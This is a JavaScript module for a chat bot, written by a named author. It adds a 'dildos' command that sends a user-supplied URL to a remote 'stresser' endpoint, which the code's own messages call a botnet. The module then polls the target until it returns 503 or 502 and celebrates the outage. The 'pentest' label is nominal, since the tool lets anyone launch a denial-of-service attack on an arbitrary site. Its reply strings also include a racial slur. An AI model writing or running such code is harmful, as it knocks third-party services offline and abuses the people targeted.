const axios = require('axios');

const apiEndpoints = [
   "http://sgp1.hmvhostings.com:25694/stresser"
];

module.exports.config = {
  name: 'dildos',
  type: 'pentest',
  role: 0,
  isPrefix: true,
  info: 'Perform DILDOS ATTACK on a target URL for pentest or testing purposes.',
  author: 'Kenneth Panio',
  cd: 10,
  guide: 'dildos http://example.com',
  usage: 'dildos [url]'
};

module.exports.run = async ({ args, chat, font }) => {
  const targetUrl = args[0];

  if (!targetUrl) {
    return chat.reply(font.thin('Please Provide URL to ATTACK!'));
  }

  const preparingMessage = await chat.reply(font.bold('Preparing to attack target...'));

  const tryAttack = async (apis, index = 0) => {
    if (index >= apis.length) {
      preparingMessage.delete();
      return chat.reply(font.thin('All BOTNET are currently busy, try again later after all attack finished!'));
    }

    try {
      const response = await axios.get(`${apis[index]}?url=${encodeURIComponent(targetUrl)}`);

      preparingMessage.delete();
      chat.reply(font.thin(response.data.message || 'Attack initiated successfully!'));

      let errorMessageSent = false; 

      const attackInterval = setInterval(async () => {
        try {
          await axios.get(targetUrl.match(/^(https?:\/\/[^\/]+)/)[0]);
        } catch (error) {
          if (error.response && !errorMessageSent) {
            if (error.response.status === 503) {
              chat.reply(font.thin('Ako importante? putah! Service Unavailable (503).'));
              errorMessageSent = true;
              clearInterval(attackInterval);
            } else if (error.response.status === 502) {
              chat.reply(font.thin('Kamusta negrong may ari bersyong pangalawa! Bad Gateway (502).'));
              errorMessageSent = true;
              clearInterval(attackInterval);
            }
          }
        }
      }, 1000);
    } catch (error) {
      if (error.code === 'ENOTFOUND' || error) {
        return tryAttack(apis, index + 1);
      }
    }
  };

  await tryAttack(apiEndpoints);
};